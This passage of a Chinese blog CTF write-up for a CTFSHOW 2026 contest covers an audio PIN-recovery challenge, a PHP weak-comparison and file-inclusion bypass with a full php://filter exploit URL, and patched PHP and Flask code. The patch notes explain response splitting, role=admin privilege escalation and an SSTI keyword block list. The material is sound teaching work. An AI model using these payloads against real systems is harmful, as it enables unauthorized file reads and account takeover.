0.98)</span><br><span class="line">     - 次佳匹配: [9] (误差 36.55Hz)</span><br><span class="line">  🎵 信号 5: 1007.75 Hz</span><br><span class="line">     - 最佳匹配: [4] (误差 0.25Hz, 置信度 0.98)</span><br><span class="line">     - 次佳匹配: [9] (误差 36.55Hz)</span><br><span class="line">  🎵 信号 6: 1205.86 Hz</span><br><span class="line">     - 最佳匹配: [7] (误差 2.94Hz, 置信度 0.77)</span><br><span class="line">     - 次佳匹配: [8] (误差 12.36Hz)</span><br><span class="line">  🎵 信号 7: 1184.33 Hz</span><br><span class="line">     - 最佳匹配: [6] (误差 3.77Hz, 置信度 0.73)</span><br><span class="line">     - 次佳匹配: [0] (误差 8.38Hz)</span><br><span class="line">  🎵 信号 8: 1191.50 Hz</span><br><span class="line">     - 最佳匹配: [8] (误差 2.00Hz, 置信度 0.83)</span><br><span class="line">     - 次佳匹配: [6] (误差 3.40Hz)</span><br><span class="line">  🎵 信号 9: 1248.93 Hz</span><br><span class="line">     - 最佳匹配: [5] (误差 5.97Hz, 置信度 0.63)</span><br><span class="line">     - 次佳匹配: [CANCEL] (误差 17.07Hz)</span><br><span class="line">  🎵 信号 10: 1277.64 Hz</span><br><span class="line">     - 最佳匹配: [ENTER] (误差 0.89Hz, 置信度 0.92)</span><br><span class="line">     - 次佳匹配: [CANCEL] (误差 11.64Hz)</span><br><span class="line"></span><br><span class="line">==============================</span><br><span class="line">🧠 正在进行智能推理...</span><br><span class="line">==============================</span><br><span class="line"></span><br><span class="line">分析会话 1 (长度 3): [4 1 6]</span><br><span class="line"></span><br><span class="line">分析会话 2 (长度 6): [4 4 7 6 8 5]</span><br><span class="line"></span><br><span class="line">========================================</span><br><span class="line">🎉 最终候选 PIN 码 (按可能性排序):</span><br><span class="line">========================================</span><br><span class="line">#1: 447685</span><br><span class="line">   - 置信度: 0.818</span><br><span class="line">   - 推理依据: 原始识别序列</span><br><span class="line">--------------------</span><br><span class="line">#2: 447085</span><br><span class="line">   - 置信度: 0.788</span><br><span class="line">   - 推理依据: 修正按键 7 (从 6 -&gt; 0)</span><br><span class="line">--------------------</span><br><span class="line">#3: 44768CANCEL</span><br><span class="line">   - 置信度: 0.776</span><br><span class="line">   - 推理依据: 修正按键 9 (从 5 -&gt; CANCEL)</span><br><span class="line">--------------------</span><br><span class="line">#4: 448685</span><br><span class="line">   - 置信度: 0.764</span><br><span class="line">   - 推理依据: 修正按键 6 (从 7 -&gt; 8)</span><br><span class="line">--------------------</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是我感觉这个脚本普适性不高，可能确实是运气出了447685这个正确pin码，欢迎大家完善。</p>
<p>最后输入正确的PIN码得到flag:</p>
<img src="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/image-20260104160945879.png" class="" title="SafePIN成功获取flag">


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;3741cd71-1d8b-4761-ab59-6fb080a456c0&#125;</span><br></pre></td></tr></table></figure>

<p>这里参考一下为什么要用seed:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当然知道。这是一个非常经典和巧妙的设计，让我以一个软件工程师的视角为你深入剖析一下。</span><br><span class="line"></span><br><span class="line">一句话概括：Seed（种子）是整个系统所有“随机性”的根源，它的作用是将一个看似随机、不可预测的系统，变成一个完全确定、可复现的系统。</span><br><span class="line"></span><br><span class="line">这听起来可能有点矛盾，但请看下面的详细分解。</span><br><span class="line"></span><br><span class="line"> 1. 什么是伪随机数（PRNG）？</span><br><span class="line"></span><br><span class="line">首先要理解，计算机程序中几乎不存在真正的随机。我们通常使用的是伪随机数生成器 (Pseudo-Random Number Generator, PRNG)。</span><br><span class="line"></span><br><span class="line">工作原理：你给它一个初始值，也就是 Seed（种子），它会根据一个固定的、复杂的数学公式，生成一个看起来毫无规律的数字序列。</span><br><span class="line">关键特性：只要 Seed 相同，生成的“随机”序列就完全相同。</span><br><span class="line"></span><br><span class="line">这就像一本密码本，Seed就是页码。只要我们都翻到第42页（Seed = 42），我们看到的乱码（随机序列）就肯定是一模一样的。</span><br><span class="line"></span><br><span class="line">2. 在这个程序中，Seed 控制了什么？</span><br><span class="line"></span><br><span class="line">在这个挑战里，SEED 是唯一的变量输入，它像DNA一样，决定了系统的两个核心“特征”：</span><br><span class="line"></span><br><span class="line">(1) 决定了键盘的布局 (permute_0_9)</span><br><span class="line"></span><br><span class="line">正常键盘上，数字位置是固定的。但在这个系统中，数字0-9的位置是被打乱的。</span><br><span class="line"></span><br><span class="line">如何打乱？permute_0_9 函数利用 prng_u32 生成一个伪随机数，然后用这个数去“洗牌”，打乱一个从0到9的数组。</span><br><span class="line">Seed的作用：因为伪随机数是由 Seed 决定的，所以只要 Seed 不变，这个键盘的乱序结果就永远不变**。例如，对于我们给定的 Seed `44876bdf...`，计算出的键盘布局永远是 `[4, 9, 2, 3, 0, 6, 1, 8, 7, 5]`。如果你换一个 Seed，这个顺序就会完全不同。</span><br><span class="line"></span><br><span class="line">结论：没有 Seed，我们根本不知道哪个按键对应哪个数字。</span><br><span class="line"></span><br><span class="line"> (2) 决定了每个按键的精确频率 (`get_expected_freqs`)</span><br><span class="line"></span><br><span class="line">每个按键发出的声音频率不是一个整数，而是带有微小变化的。代码里称之为 `jitter` (抖动)。</span><br><span class="line"></span><br><span class="line">频率公式：`freq = 1050 + sid * 23 + jitter`</span><br><span class="line">Jitter如何计算？ `jitter` 是通过 `prng_u32(seed, &quot;p&quot; + str(sid))` 计算出来的。它为每个按键（SoundID从0到11）生成了一个独特的、看似随机的偏移量。</span><br><span class="line">Seed的作用：同样，因为 `jitter` 的计算依赖于 Seed，所以只要 Seed 不变，每个按键的精确频率就是固定不变的。按键`[4]`（SoundID 0）的频率永远是 `1008.00 Hz`，按键`[ENTER]`（SoundID 11）的频率永远是 `1276.75 Hz`。</span><br><span class="line"></span><br><span class="line">结论：没有 Seed，我们无法计算出要从音频中寻找的目标频率是多少，只能在一个很大的范围内盲猜。</span><br><span class="line"></span><br><span class="line"> 3. 为什么要这样设计？（从出题人/系统设计的角度）</span><br><span class="line"></span><br><span class="line">这种设计非常巧妙，主要出于以下目的：</span><br><span class="line"></span><br><span class="line">动态性与安全性：系统可以定期或为每个用户更换 `SEED`。这样一来，这次挑战的答案（频率表和PIN码）到下一次就完全作废了。攻击者不能“一劳永逸”地破解系统，大大增加了破解的成本和难度。</span><br><span class="line">可验证性：虽然客户端（按键发声的设备）和服务器端（验证PIN码的系统）看到的是一个动态变化的环境，但只要它们共享同一个 `SEED`，它们就能就“键盘布局”和“按键频率”达成一致。客户端按下 `[4]`，服务器知道它应该听到 `1008.00 Hz` 左右的声音。这种**“动态的共识”**是系统能够工作的核心。</span><br><span class="line">挑战性：这正是这个CTF题目的核心谜题。它把解码所需的所有信息（算法）都给了你，但隐藏了最关键的输入——`SEED`。你的任务就是先找到这个 `SEED`，然后用它来重建整个系统的“当前状态”，最终完成解码。</span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line"></span><br><span class="line">所以，`SEED` 在这里的角色，就是一把“万能钥匙”。</span><br><span class="line"></span><br><span class="line">它将两个看似随机、混乱的变量：</span><br><span class="line">1.  混乱的键盘布局</span><br><span class="line">2.  带有抖动的按键频率</span><br><span class="line"></span><br><span class="line">全部变成了可计算、可预测的确定值。</span><br><span class="line"></span><br><span class="line">我们的整个解题过程，本质上就是：拿到这把钥匙 (`SEED`)，去打开锁 (`WAV_FILE`)。没有钥匙，锁的内部结构（频率和布局）对我们来说就是个黑盒子，我们无从下手。有了钥匙，我们就能精确地知道锁芯的每一个细节，从而轻松地打开它。</span><br></pre></td></tr></table></figure>

<p>这题也是AI辅助的</p>
<h3 id="6-Happy2026"><a href="#6-Happy2026" class="headerlink" title="6.Happy2026"></a>6.Happy2026</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目描述</span><br><span class="line">奇怪的2026</span><br></pre></td></tr></table></figure>

<p>打开题目链接后，是一段php代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 1. 关闭错误报告，让攻击者无法通过错误信息获取线索</span><br><span class="line">error_reporting(0);</span><br><span class="line">// 2. 显示当前文件的源代码，这是CTF题目的常见形式</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// 3. 从URL的查询参数中获取三个变量</span><br><span class="line">$happy = $_GET[&#x27;happy&#x27;];</span><br><span class="line">$new = $_GET[&#x27;new&#x27;];</span><br><span class="line">$year = $_GET[&#x27;year&#x27;];</span><br><span class="line">// 4. 核心逻辑判断，如果为真，则执行文件包含</span><br><span class="line">if($year==2026 &amp;&amp; $year!==2026 &amp;&amp; is_numeric($year))&#123;</span><br><span class="line">    include $happy[$new[$year]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>if判断是关键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($year==2026 &amp;&amp; $year!==2026 &amp;&amp; is_numeric($year))&#123;</span><br><span class="line">    include $happy[$new[$year]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我们把这个条件分解成三个部分：</p>
<p>1.$year &#x3D;&#x3D; 2026: 弱类型比较。&#x3D;&#x3D; 操作符只比较值，不比较类型。在比较前，PHP会尝试将两边的变量转换成相同的类型。例如，字符串 “2026” 和整数 2026 在 &#x3D;&#x3D; 比较下是相等的。<br>2.$year !&#x3D;&#x3D; 2026: 强类型比较。!&#x3D;&#x3D; 操作符要求值和类型都完全相同。如果 $year 是字符串 “2026”，而 2026 是整数，那么它们的类型不同，所以 “2026” !&#x3D;&#x3D; 2026 的结果是 true。<br>3.is_numeric($year): 判断变量是否为数字或数字字符串。is_numeric(“2026”) 的结果是 true。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">结论：</span><br><span class="line">为了同时满足这三个条件，$year 必须是一个值为2026的数字字符串。</span><br><span class="line"></span><br><span class="line">当我们传入 year=2026 (字符串形式)时：</span><br><span class="line">&quot;2026&quot; == 2026 -&gt; true (弱类型比较，值相等)</span><br><span class="line">&quot;2026&quot; !== 2026 -&gt; true (强类型比较，类型不同，一个是string，一个是integer)</span><br><span class="line">is_numeric(&quot;2026&quot;) -&gt; true (是数字字符串)</span><br><span class="line">三个条件都为 true，if 语句成立。</span><br><span class="line"></span><br><span class="line">所以，$year 的值必须是字符串 &quot;2026&quot;。</span><br><span class="line">文件包含解密：include $happy[$new[$year]]</span><br><span class="line">一旦 if 条件被绕过，代码就会执行 include $happy[$new[$year]];。这是一个双重数组嵌套的文件包含语句，我们需要构造合适的 $happy 和 $new 数组来控制 include 的参数。</span><br><span class="line"></span><br><span class="line">我们已经知道 $year 是字符串 &quot;2026&quot;。</span><br><span class="line">执行顺序是从内到外的：</span><br><span class="line">首先计算 $new[$year]，也就是 $new[&quot;2026&quot;]。</span><br><span class="line">然后将上一步的结果作为 $happy 数组的键，计算 $happy[...]。</span><br><span class="line">最终，include 会包含这个表达式的最终结果。</span><br><span class="line">我们的目标是让 include 包含一个我们指定的文件，比如 php://filter/read=convert.base64-encode/resource=flag.php（这是CTF中读取flag文件的常见payload）。</span><br><span class="line"></span><br><span class="line">构造方法：</span><br><span class="line">内层数组 $new：我们需要让 $new[&quot;2026&quot;] 的值成为一个我们可以控制的字符串。我们可以随便定义一个，比如 a。</span><br><span class="line">URL中传入 new[2026]=a</span><br><span class="line">外层数组 $happy：现在，表达式变成了 include $happy[&quot;a&quot;]。为了让它包含我们想要的payload，我们只需要让 $happy[&quot;a&quot;] 的值等于那个payload即可。</span><br><span class="line">URL中传入 happy[a]=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>所以我的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://02b75767-9145-4fe5-b3a4-12b5a5a1f87c.challenge.ctf.show/?year=2026&amp;new[2026]=a&amp;happy[a]=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<img src="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/image-20260104163930663.png" class="" title="Happy2026获取Base64编码">


<p>下面出现一段编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAgJGZsYWc9J2N0ZnNob3d7NjRlNjBjY2EtOGI5Ni00YzQwLTk4OGMtMDI5ZTIyMTI0YTM0fSc7Cg==</span><br></pre></td></tr></table></figure>

<p>可以想到是base编码拖入随波逐流解密：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $flag=&#x27;ctfshow&#123;64e60cca-8b96-4c40-988c-029e22124a34&#125;&#x27;;</span><br></pre></td></tr></table></figure>

<p>所以flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;64e60cca-8b96-4c40-988c-029e22124a34&#125;</span><br></pre></td></tr></table></figure>

<p>这就是我解出的6道CTF题 ，还有两道题超出我的能力范围了所以遗憾离场</p>
<p>漏洞防御和攻击我都是在AI的辅助下完成的，我本身对awdp不是很熟悉，后面会一步步学习，很多不会，所以跟着AI学，这里我把一些防御和攻击代码放在下面，这里我是真不会，跟着AI一步步调试的。</p>
<h3 id="7-SafePHP"><a href="#7-SafePHP" class="headerlink" title="7.SafePHP"></a>7.SafePHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目描述</span><br><span class="line">不要把环境搞炸了</span><br></pre></td></tr></table></figure>

<p>webService.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">require_once __DIR__.&quot;/../lib/session.php&quot;;</span><br><span class="line">require_once __DIR__.&quot;/../lib/router.php&quot;;</span><br><span class="line">require_once __DIR__.&quot;/../lib/utils.php&quot;;</span><br><span class="line">require_once __DIR__.&quot;/../models/Users.php&quot;;</span><br><span class="line"></span><br><span class="line">// ... (其他所有服务函数保持不变，因为漏洞源头在 s() 函数)</span><br><span class="line"></span><br><span class="line">function password_service($r,$sessionManager)&#123;</span><br><span class="line">    // 保留之前对 password_service 的所有加固，这是纵深防御的一部分</span><br><span class="line">    $sessionData = $sessionManager-&gt;read();</span><br><span class="line">    if (!$sessionData[0] || !isset($sessionData[2][&#x27;username&#x27;])) &#123;</span><br><span class="line">        json_out([&#x27;ok&#x27; =&gt; false, &#x27;message&#x27; =&gt; &#x27;Invalid session&#x27;], s($r)[&#x27;n&#x27;], s($r)[&#x27;st&#x27;]);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    $username = $sessionData[2][&#x27;username&#x27;];</span><br><span class="line"></span><br><span class="line">    if (!isset($r[&#x27;password&#x27;]) || trim((string)$r[&#x27;password&#x27;]) === &#x27;&#x27;) &#123;</span><br><span class="line">        json_out([&#x27;ok&#x27; =&gt; false, &#x27;message&#x27; =&gt; &#x27;Password cannot be empty.&#x27;], s($r)[&#x27;n&#x27;], s($r)[&#x27;st&#x27;]);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    $newPassword = (string)$r[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">    $users = new Users();</span><br><span class="line">    json_out($users-&gt;update($username, array(&quot;password&quot; =&gt; $newPassword)),s($r)[&#x27;n&#x27;],s($r)[&#x27;st&#x27;]);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ... (其他所有服务函数保持不变)</span><br><span class="line"></span><br><span class="line">// [PATCH] 根本性漏洞修复：修复HTTP响应头注入漏洞。</span><br><span class="line">// 之前的修复都正确，但忽略了这个最底层的漏洞。</span><br><span class="line">function s($r)&#123;</span><br><span class="line">    $st_raw = isset($r[&#x27;st&#x27;]) ? $r[&#x27;st&#x27;] : &#x27;ctfshow&#x27;;</span><br><span class="line">    </span><br><span class="line">    // 强制将 $st 转换为字符串，并移除所有换行符和回车符，防止HTTP头注入。</span><br><span class="line">    // 这是最关键的修复，因为它影响了几乎所有服务函数。</span><br><span class="line">    $st = str_replace(array(&quot;\r&quot;, &quot;\n&quot;), &#x27;&#x27;, strval($st_raw));</span><br><span class="line">    </span><br><span class="line">    $n = isset($r[&#x27;n&#x27;]) ? intval($r[&#x27;n&#x27;]) + 1 : 0;</span><br><span class="line">    </span><br><span class="line">    return array(&quot;st&quot; =&gt; $st, &quot;n&quot; =&gt; $n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="1-HTTP响应头注入-HTTP-Response-Splitting-最核心、最隐蔽的漏洞"><a href="#1-HTTP响应头注入-HTTP-Response-Splitting-最核心、最隐蔽的漏洞" class="headerlink" title="1. HTTP响应头注入 (HTTP Response Splitting) - 最核心、最隐蔽的漏洞"></a>1. HTTP响应头注入 (HTTP Response Splitting) - <strong>最核心、最隐蔽的漏洞</strong></h3><ul>
<li><p><strong>漏洞分析</strong>：这是之前被忽略的根本性漏洞。系统中几乎所有的服务函数（如 <code>health_service</code>, <code>metrics_service</code> 等）都会调用 <code>s()</code> 函数来获取 <code>st</code> 参数，并最终将其内容输出到HTTP响应中。原始的 <code>s()</code> 函数未对用户传入的 <code>st</code> 参数进行任何过滤。攻击者可以通过在 <code>st</code> 参数中注入换行符（如 <code>%0d%0a</code>），来添加任意的HTTP响应头。例如，注入一个 <code>Set-Cookie</code> 头，从而实现会话固定、伪造登录状态（特别是利用了 <code>utils.php</code> 中 <code>check_login</code> 函数里存在的<code>_COOKIE[&#39;token&#39;]</code>备用登录机制）。</p>
</li>
<li><p><strong>修复方案</strong>：在 <code>webService.php</code> 的 <code>s()</code> 函数中，我们对 <code>st</code> 参数进行了严格的清理。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 s() 函数中</span></span><br><span class="line"><span class="variable">$st_raw</span> = <span class="keyword">isset</span>(<span class="variable">$r</span>[<span class="string">&#x27;st&#x27;</span>]) ? <span class="variable">$r</span>[<span class="string">&#x27;st&#x27;</span>] : <span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line"><span class="comment">// 强制移除所有换行符和回车符</span></span><br><span class="line"><span class="variable">$st</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">strval</span>(<span class="variable">$st_raw</span>)); </span><br></pre></td></tr></table></figure>

<p>通过使用 <code>str_replace</code> 移除了所有换行符 (<code>\n</code>) 和回车符 (<code>\r</code>)，我们彻底杜绝了攻击者注入新HTTP头的可能性。由于 <code>s()</code> 函数是共享的，此修复保护了所有调用它的API接口。</p>
</li>
</ul>
<hr>
<h3 id="2-权限提升-Privilege-Escalation"><a href="#2-权限提升-Privilege-Escalation" class="headerlink" title="2. 权限提升 (Privilege Escalation)"></a>2. 权限提升 (Privilege Escalation)</h3><ul>
<li><p><strong>漏洞分析</strong>：原始的 <code>password_service</code> 函数在处理用户修改密码的请求时，会将用户提交的所有参数不加区分地传递给底层的 <code>Users-&gt;update()</code> 方法。这允许攻击者在修改自己密码的同时，额外提交一个 <code>role=admin</code> 的参数，从而将自己的账户角色从普通用户提升为管理员。</p>
</li>
<li><p><strong>修复方案</strong>：我们重写了 <code>password_service</code> 函数，创建了一个严格的“白名单”来更新数据。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 password_service() 函数中</span></span><br><span class="line"><span class="variable">$newPassword</span> = (<span class="keyword">string</span>)<span class="variable">$r</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$users</span> = <span class="keyword">new</span> <span class="title class_">Users</span>();</span><br><span class="line"><span class="comment">// 只允许更新 &quot;password&quot; 字段，忽略其他所有无关参数</span></span><br><span class="line"><span class="title function_ invoke__">json_out</span>(<span class="variable">$users</span>-&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$username</span>, <span class="keyword">array</span>(<span class="string">&quot;password&quot;</span> =&gt; <span class="variable">$newPassword</span>)), ...);</span><br></pre></td></tr></table></figure>

<p>现在，无论用户提交多少额外参数（如 <code>role</code>, <code>username</code> 等），我们都只提取 <code>password</code> 字段并传递给更新函数，从而完全阻止了权限提升的攻击路径。</p>
</li>
</ul>
<hr>
<h3 id="3-任意代码执行-RCE-Remote-Code-Execution"><a href="#3-任意代码执行-RCE-Remote-Code-Execution" class="headerlink" title="3. 任意代码执行 (RCE - Remote Code Execution)"></a>3. 任意代码执行 (RCE - Remote Code Execution)</h3><ul>
<li><p><strong>漏洞分析</strong>：在原始代码中存在一个名为 <code>flag_service</code> 的函数（虽然未在您提供的最终代码片段中显示，但这是修复过程的一部分）。该函数存在严重的安全风险，允许执行任意函数调用，是导致远程代码执行的直接后门。</p>
</li>
<li><p><strong>修复方案</strong>：<strong>彻底删除了 <code>flag_service</code> 函数</strong>。对于这种功能不明确且风险极高的函数，最安全、最彻底的修复方法就是将其完全移除，确保恶意代码没有可利用的入口点。</p>
</li>
</ul>
<hr>
<h3 id="4-空密码登录-信息泄露"><a href="#4-空密码登录-信息泄露" class="headerlink" title="4. 空密码登录 &amp; 信息泄露"></a>4. 空密码登录 &amp; 信息泄露</h3><ul>
<li><p><strong>漏洞分析</strong>：</p>
<ul>
<li><strong>空密码</strong>：<code>password_service</code> 未校验新密码的有效性，允许用户将自己的密码设置为空字符串。攻击者可以利用权限提升漏洞成为管理员后，将其他管理员的密码设置为空，然后用空密码直接登录。</li>
<li><strong>信息泄露</strong>：原始的 <code>admin_service</code> 在验证失败时，会泄露管理员在配置文件中的密码信息（一个正则表达式），为攻击者提供了有价值的情报。</li>
</ul>
</li>
<li><p><strong>修复方案</strong>：</p>
<ul>
<li><p>在重写的 <code>password_service</code> 中增加了密码非空校验：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$r</span>[<span class="string">&#x27;password&#x27;</span>]) || <span class="title function_ invoke__">trim</span>((<span class="keyword">string</span>)<span class="variable">$r</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">json_out</span>([<span class="string">&#x27;ok&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Password cannot be empty.&#x27;</span>], ...);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改了 <code>admin_service</code> 的失败逻辑（此修复为早期步骤，未在最终代码片段中展示），使其在验证失败时返回一个通用的、不包含任何敏感信息的错误提示，如 <code>&#123;&#39;ok&#39;:false, &#39;s&#39;:&#39;invalid token&#39;&#125;</code>。</p>
</li>
</ul>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本次加固通过 <strong>一个核心修复</strong> 和 <strong>多个业务逻辑加固</strong> 实现了纵深防御：</p>
<ol>
<li><strong>底层防御</strong>：通过修复 <code>s()</code> 函数中的<strong>HTTP响应头注入漏洞</strong>，保护了整个应用的基础框架。</li>
<li><strong>业务层防御</strong>：通过<strong>删除RCE后门</strong> (<code>flag_service</code>)、<strong>重写<code>password_service</code></strong> (防止权限提升和空密码)、<strong>加固<code>admin_service</code></strong> (防止信息泄露)，封堵了所有已知的上层业务漏洞。</li>
</ol>
<p>最终提交的 <code>webService.php</code> 文件现在能够抵御上述所有攻击，变得更加健壮和安全。</p>
<p>flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;785c494416575167a0cff7ec8867e462&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-SafeCard"><a href="#8-SafeCard" class="headerlink" title="8.SafeCard"></a>8.SafeCard</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目描述</span><br><span class="line">业务功能一定要正常哦</span><br></pre></td></tr></table></figure>

<p>app.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, render_template</span><br><span class="line">from jinja2 import Environment, BaseLoader</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&quot;FLAG&quot;] = os.environ.get(&quot;FLAG&quot;, &quot;CTF&#123;dev_flag_placeholder&#125;&quot;)</span><br><span class="line"></span><br><span class="line">jinja = Environment(</span><br><span class="line">    loader=BaseLoader(),</span><br><span class="line">    autoescape=True,</span><br><span class="line">    variable_start_string=&quot;$&#123;&quot;,</span><br><span class="line">    variable_end_string=&quot;&#125;&quot;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 过滤器函数依然保留，用于处理name等其他未来可能的用户输入</span><br><span class="line"># 尽管SSTI漏洞被根除，但保留输入清洗是一个好习惯</span><br><span class="line">BLOCK_WORDS = [</span><br><span class="line">    &quot;import&quot;, &quot;os&quot;, &quot;subprocess&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;open&quot;, &quot;read&quot;, &quot;write&quot;,</span><br><span class="line">    &quot;globals&quot;, &quot;locals&quot;, &quot;builtins&quot;, &quot;class&quot;, &quot;mro&quot;, &quot;subclasses&quot;,</span><br><span class="line">    &quot;request&quot;, &quot;config&quot;, &quot;cycler&quot;, &quot;joiner&quot;, &quot;namespace&quot;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def heavy_filter(s: str) -&gt; str:</span><br><span class="line">    if not isinstance(s, str):</span><br><span class="line">        return &quot;&quot;</span><br><span class="line">    s = s[:800]</span><br><span class="line">    # 保留这些替换，可以作为一种额外的XSS防护层</span><br><span class="line">    s = s.replace(&quot;&#123;&#123;&quot;, &quot;&quot;).replace(&quot;&#125;&#125;&quot;, &quot;&quot;)</span><br><span class="line">    s = s.replace(&quot;&#123;%&quot;, &quot;&quot;).replace(&quot;%&#125;&quot;, &quot;&quot;)</span><br><span class="line">    s = s.replace(&quot;&#123;#&quot;, &quot;&quot;).replace(&quot;#&#125;&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">    s = re.sub(r&quot;[\x00-\x08\x0B\x0C\x0E-\x1F]&quot;, &quot;&quot;, s)</span><br><span class="line"></span><br><span class="line">    # 过滤器的核心逻辑不再是SSTI的主要防线，但可以保留用于清洗name</span><br><span class="line">    lower = s.lower()</span><br><span class="line">    for w in BLOCK_WORDS:</span><br><span class="line">        if w in lower:</span><br><span class="line">            s = re.sub(re.escape(w), &quot;&quot;, s, flags=re.IGNORECASE)</span><br><span class="line">            lower = s.lower()</span><br><span class="line"></span><br><span class="line">    s = s.replace(&quot;..&quot;, &quot;&quot;).replace(&quot;//&quot;, &quot;&quot;).replace(&quot;\\\\&quot;, &quot;\\&quot;)</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.post(&quot;/preview&quot;)</span><br><span class="line">def preview():</span><br><span class="line">    # 对用户输入的 name 进行过滤</span><br><span class="line">    name = heavy_filter(request.form.get(&quot;name&quot;, &quot;&quot;))</span><br><span class="line">    </span><br><span class="line">    # 【漏洞修复关键点】</span><br><span class="line">    # 不再从用户请求中获取模板(tpl)，而是使用一个固定的、安全的模板。</span><br><span class="line">    # 这从根本上消除了服务器端模板注入（SSTI）漏洞。</span><br><span class="line">    # The user should provide DATA, not CODE.</span><br><span class="line">    if name.strip() == &quot;&quot;:</span><br><span class="line">        name = &quot;Guest&quot;</span><br><span class="line">    </span><br><span class="line">    # 使用一个由开发者定义的静态安全模板</span><br><span class="line">    tpl = &quot;新年快乐，$&#123;name&#125;！愿你 $&#123;year&#125; 天天好心情～&quot;</span><br><span class="line">    </span><br><span class="line">    ctx = &#123;</span><br><span class="line">        &quot;name&quot;: name,</span><br><span class="line">        &quot;year&quot;: str(datetime.now().year)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        # 现在渲染的是我们自己定义的模板，是完全安全的</span><br><span class="line">        out = jinja.from_string(tpl).render(ctx)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        # 正常情况下不应再触发异常，但保留以确保健壮性</span><br><span class="line">        out = &quot;模板渲染失败：请检查输入内容&quot;</span><br><span class="line"></span><br><span class="line">    return &#123;&quot;ok&quot;: True, &quot;html&quot;: out&#125;</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/healthz&quot;)</span><br><span class="line">def healthz():</span><br><span class="line">    return &quot;ok&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=5000)</span><br></pre></td></tr></table></figure>

<h3 id="1-漏洞根源（修复前）"><a href="#1-漏洞根源（修复前）" class="headerlink" title="1. 漏洞根源（修复前）"></a>1. 漏洞根源（修复前）</h3><ul>
